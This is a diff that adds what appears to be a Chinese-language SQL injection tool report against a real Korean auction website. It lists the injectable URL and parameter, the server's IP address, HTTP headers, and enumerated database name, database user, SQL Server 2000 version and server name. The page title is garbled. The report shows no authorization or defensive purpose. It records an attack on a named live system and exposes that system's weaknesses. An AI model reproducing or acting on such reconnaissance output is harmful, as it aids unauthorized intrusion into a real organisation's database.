@@ -1,0 +1,42 @@
+■漏洞信息:============================================================
+ ·URL:http://www.auctionsky.co.kr/web/board/board_view.asp?menu_id=22&page_no=1&id=259
+ ·页面标题：且牢亲傍傈巩 柯扼牢 咯青弊缝 悼剧飘贰喉付飘涝聪促.
+ ·参数:menu_id=22&page_no=1&id=259
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.108.62.146
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:36:35 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 63393
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAACDSQQQ=JEEFPHCAEICOLJFDLBNPBAFE; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：auctionsky
+- 用户名：dbu_auctionsky
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NS2
+- 服务名：MSSQLSERVER
+- 系统用户名：dbu_auctionsky
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
